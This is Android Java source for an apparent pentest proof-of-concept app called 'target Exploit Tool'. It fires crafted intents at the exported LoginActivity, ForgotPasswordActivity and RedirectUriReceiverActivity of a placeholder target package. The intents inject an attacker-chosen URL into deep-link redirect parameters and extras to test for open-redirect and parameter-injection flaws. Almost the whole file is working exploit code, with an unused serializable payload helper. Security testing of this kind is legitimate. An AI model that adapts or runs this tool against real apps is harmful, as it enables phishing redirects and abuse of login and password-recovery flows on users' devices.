package com.pentest.chi;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    
    private static final String TAG = "CHIPOCApp";
    private static final String TARGET_PACKAGE = "com.target.exported.function";
    
    private EditText editTextUrl;
    private TextView textViewLog;
    private Button btnBlankActivity;
    private Button btnForgotPassword;
    private Button btnRedirectFragment;
    private Button btnDeepActivity;
    private Button btnClearLog;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initializeViews();
        setupClickListeners();
        
        logMessage("target Exploit Tool initialized");
        checkTargetApp();
    }
    
    private void initializeViews() {
        editTextUrl = findViewById(R.id.editTextUrl);
        textViewLog = findViewById(R.id.textViewLog);
        btnBlankActivity = findViewById(R.id.btnBlankActivity);
        btnForgotPassword = findViewById(R.id.btnForgotPassword);
        btnRedirectFragment = findViewById(R.id.btnRedirectFragment);
        btnDeepActivity = findViewById(R.id.btnDeepActivity);
        btnClearLog = findViewById(R.id.btnClearLog);
        
        // Make log scrollable
        textViewLog.setMovementMethod(new ScrollingMovementMethod());
    }
    
    private void setupClickListeners() {
        btnBlankActivity.setOnClickListener(v -> exploitBlankActivity());
        btnForgotPassword.setOnClickListener(v -> exploitForgotPassword());
        btnRedirectFragment.setOnClickListener(v -> exploitRedirectFragment());
        btnDeepActivity.setOnClickListener(v -> exploitDeepActivity());
        btnClearLog.setOnClickListener(v -> clearLog());
    }
    
    private void checkTargetApp() {
        try {
            getPackageManager().getPackageInfo(TARGET_PACKAGE, 0);
            logMessage("✓ Target app found: " + TARGET_PACKAGE);
        } catch (PackageManager.NameNotFoundException e) {
            logMessage("✗ Target app NOT found: " + TARGET_PACKAGE);
            logMessage("Please install target app first, this check might be faulty");
            Toast.makeText(this, "Target app not installed", Toast.LENGTH_LONG).show();
        }
    }
    
    private void exploitBlankActivity() {
        String url = editTextUrl.getText().toString().trim();
        if (url.isEmpty()) {
            url = "https://counterhack.com";
        }
        
        logMessage("=== EXPLOIT 1: LoginActivity Deep Link Test ===");
        logMessage("Target: LoginActivity (exported) - testing intent reception");
        logMessage("URL: " + url);
        
        try {
            // Test basic intent launch to LoginActivity
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("https://target.com/test?param=" + url));
            intent.setClassName(TARGET_PACKAGE, TARGET_PACKAGE + ".views.LoginActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            startActivity(intent);
            logMessage("✓ LoginActivity intent launched");
            Toast.makeText(this, "LoginActivity intent launched", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            logMessage("✗ LoginActivity exploit failed: " + e.getMessage());
            Log.e(TAG, "LoginActivity exploit failed", e);
        }
    }
    
    private void exploitForgotPassword() {
        String url = editTextUrl.getText().toString().trim();
        if (url.isEmpty()) {
            url = "https://counterhack.com";
        }
        
        logMessage("=== EXPLOIT 2: ForgotPasswordActivity Deep Link ===");
        logMessage("Target: ForgotPasswordActivity (exported) with HTTPS intent-filter");
        logMessage("URL: " + url);
        
        try {
            // ForgotPasswordActivity accepts HTTPS URLs with specific path
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("https://www.target.com/test/recoverpassword.aspx?redirect=" + url));
            intent.setClassName(TARGET_PACKAGE, TARGET_PACKAGE + ".views.ForgotPasswordActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            startActivity(intent);
            logMessage("✓ ForgotPasswordActivity deep link exploit launched");
            Toast.makeText(this, "ForgotPasswordActivity deep link exploit launched", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            logMessage("✗ ForgotPasswordActivity exploit failed: " + e.getMessage());
            Log.e(TAG, "ForgotPasswordActivity exploit failed", e);
        }
    }
    
    private void exploitRedirectFragment() {
        String url = editTextUrl.getText().toString().trim();
        if (url.isEmpty()) {
            url = "https://counterhack.com";
        }
        
        logMessage("=== EXPLOIT 3: RedirectUriReceiverActivity ===");
        logMessage("Target: RedirectUriReceiverActivity (exported) with custom scheme");
        logMessage("URL: " + url);
        
        try {
            // RedirectUriReceiverActivity accepts custom scheme deep links
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("com.target.exported.function://redirect?url=" + url));
            intent.setClassName(TARGET_PACKAGE, "net.newapp.RedirectUriReceiverActivity");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            startActivity(intent);
            logMessage("✓ RedirectUriReceiverActivity exploit launched");
            Toast.makeText(this, "RedirectUriReceiverActivity exploit launched", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            logMessage("✗ RedirectUriReceiverActivity exploit failed: " + e.getMessage());
            Log.e(TAG, "RedirectUriReceiverActivity exploit failed", e);
        }
    }
    
    private void exploitDeepActivity() {
        String url = editTextUrl.getText().toString().trim();
        if (url.isEmpty()) {
            url = "https://counterhack.com";
        }
        
        logMessage("=== EXPLOIT 4: Deep Link Parameter Injection Test ===");
        logMessage("Target: Test deep link parameter handling vulnerabilities");
        logMessage("URL: " + url);
        
        try {
            // Test 1: LoginActivity with deep link parameters
            Intent intent1 = new Intent(Intent.ACTION_VIEW);
            intent1.setData(Uri.parse("https://target.com/test/"));
            intent1.putExtra("deep_link_params", "malicious_param=" + url);
            intent1.putExtra("bundle_key_deep_link_params", url);
            intent1.setClassName(TARGET_PACKAGE, TARGET_PACKAGE + ".views.LoginActivity");
            intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            startActivity(intent1);
            logMessage("✓ LoginActivity deep link parameters sent");
            
            // Test 2: See if any other exported receivers accept intents
            try {
                Intent intent2 = new Intent("com.target.exported.CUSTOM_ACTION");
                intent2.setData(Uri.parse("content://" + url));
                intent2.setPackage(TARGET_PACKAGE);
                intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                
                startActivity(intent2);
                logMessage("✓ Custom action intent sent");
            } catch (Exception e2) {
                logMessage("Custom action failed: " + e2.getMessage());
            }
            
            Toast.makeText(this, "Deep link parameter tests launched", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            logMessage("✗ Deep link parameter injection failed: " + e.getMessage());
            Log.e(TAG, "Deep link parameter injection failed", e);
        }
    }
    
    private Bundle createCustomPageBundle(String url) {
        Bundle bundle = new Bundle();
        bundle.putSerializable("custom_page_detail", new CustomPageData(url));
        return bundle;
    }
    
    private void logMessage(String message) {
        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        String logEntry = "[" + timestamp + "] " + message + "\n";
        
        runOnUiThread(() -> {
            textViewLog.append(logEntry);
            // Auto-scroll to bottom (only if layout is ready)
            textViewLog.post(() -> {
                if (textViewLog.getLayout() != null && textViewLog.getLineCount() > 0) {
                    final int scrollAmount = textViewLog.getLayout().getLineTop(textViewLog.getLineCount()) - textViewLog.getHeight();
                    if (scrollAmount > 0) {
                        textViewLog.scrollTo(0, scrollAmount);
                    } else {
                        textViewLog.scrollTo(0, 0);
                    }
                }
            });
        });
        
        Log.d(TAG, message);
    }
    
    private void clearLog() {
        textViewLog.setText("Log cleared.\n");
        logMessage("target Exploit Tool ready");
    }
    
    // Helper class to simulate CustomPage serializable object
    private static class CustomPageData implements java.io.Serializable {
        private String mUrl;
        private String mData;
        
        public CustomPageData(String url) {
            this.mUrl = url;
            this.mData = url;
        }
        
        public String getUrl() {
            return mUrl;
        }
        
        public String getData() {
            return mData;
        }
    }
}